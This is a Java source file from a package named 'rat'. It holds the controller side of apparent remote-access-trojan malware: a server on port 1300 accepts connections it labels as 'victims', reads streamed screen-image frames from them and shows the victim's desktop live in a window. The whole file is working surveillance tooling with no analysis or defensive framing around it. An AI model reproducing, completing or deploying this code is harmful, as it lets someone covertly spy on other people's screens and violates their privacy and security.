package rat;

import static java.awt.RenderingHints.KEY_ALPHA_INTERPOLATION;
import static java.awt.RenderingHints.KEY_ANTIALIASING;
import static java.awt.RenderingHints.KEY_INTERPOLATION;
import static java.awt.RenderingHints.KEY_RENDERING;
import static java.awt.RenderingHints.VALUE_ALPHA_INTERPOLATION_SPEED;
import static java.awt.RenderingHints.VALUE_ANTIALIAS_OFF;
import static java.awt.RenderingHints.VALUE_INTERPOLATION_NEAREST_NEIGHBOR;
import static java.awt.RenderingHints.VALUE_RENDER_SPEED;

import java.awt.Dimension;
import java.awt.Graphics2D;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;

import javax.imageio.ImageIO;
import javax.swing.ImageIcon;
import javax.swing.JFrame;
import javax.swing.JLabel;

public class Client {

	int portNum = 1300;
	ServerSocket cliSocket;

	public Client() throws IOException {
		cliSocket = new ServerSocket(1300);
		Runnable getVicRunn = () -> {

			Socket vicSocket = null;
			System.out.println("Starts listening for clients");
			while (true) {
				try {
					vicSocket = cliSocket.accept();
					System.out.println("Victem connected from " + vicSocket.getInetAddress().getHostAddress());
					JFrame jframe = new JFrame();
					JLabel l = new JLabel();
					jframe.getContentPane().add(l);
					ObjectInputStream ois = new ObjectInputStream(vicSocket.getInputStream());
					jframe.setSize(480 * 1440 / 900, 480);
					jframe.setVisible(true);

					Runnable getStream = () -> {

						Dimension d;
						ImageIcon icon;
						int screenWidth = 0;
						int screenHeight = 0;
						boolean isSetDim = false;
						BufferedImage i = null;
						while (true) {
							System.gc();
							try {
								final ArrayList<Frame> framesList = new ArrayList<Frame>();

								while (ois.readByte() == Frame.INCOMING) {
									final int x = ois.readShort();
									final int y = ois.readShort();
									final int length = ois.readInt();
									final byte[] data = new byte[length];

									ois.readFully(data);

									final BufferedImage image = toImage(data);
									final Frame frame = new Frame(x, y, image);

									framesList.add(frame);
								}

								Frame[] frames = framesList.stream().toArray(Frame[]::new);
								screenWidth = ois.readInt();
								screenHeight = ois.readInt();
								
								if (!isSetDim)
									if (screenWidth != 0 && screenHeight != 0) {
										isSetDim = true;
										i = new BufferedImage(screenWidth, screenHeight, BufferedImage.TYPE_INT_RGB);
									}
								
								d = jframe.getContentPane().getSize();

								for (final Frame frame : frames) {
									final Graphics2D g = i.createGraphics();
									//g.setRenderingHint(KEY_ANTIALIASING, VALUE_ANTIALIAS_OFF); 
									//g.setRenderingHint(KEY_RENDERING, VALUE_RENDER_SPEED); 
									//g.setRenderingHint(KEY_INTERPOLATION, VALUE_INTERPOLATION_NEAREST_NEIGHBOR); 
									//g.setRenderingHint(KEY_ALPHA_INTERPOLATION, VALUE_ALPHA_INTERPOLATION_SPEED); 

									g.drawImage(frame.image, frame.x, frame.y, null);
									g.dispose();
								}

								icon = new ImageIcon(i);

								if (d == null || icon == null)
									continue;
								if (d.width > 0 && d.height > 0
										&& (d.width != icon.getIconWidth() || d.height != icon.getIconHeight()))
									icon.setImage(icon.getImage().getScaledInstance(d.width, d.height, BufferedImage.SCALE_FAST));
								l.setIcon(icon);
								l.validate();
								jframe.validate();
							} catch (Exception ex) {
								ex.printStackTrace();
							}
							System.gc();
						}

					};
					
					Thread getStreamThread = new Thread(getStream);
					getStreamThread.run();

				} catch (IOException e) {
					e.printStackTrace();
				}
			}
		};

		Thread getVictems = new Thread(getVicRunn);
		getVictems.run();

	}

	public static BufferedImage toImage(final byte[] data) {
		final ByteArrayInputStream in = new ByteArrayInputStream(data);

		try {
			return ImageIO.read(in);
		} catch (final IOException ex) {
			ex.printStackTrace();

			return null;
		}
	}

	public static void main(String args[]) throws IOException {
		new Client();
	}

}
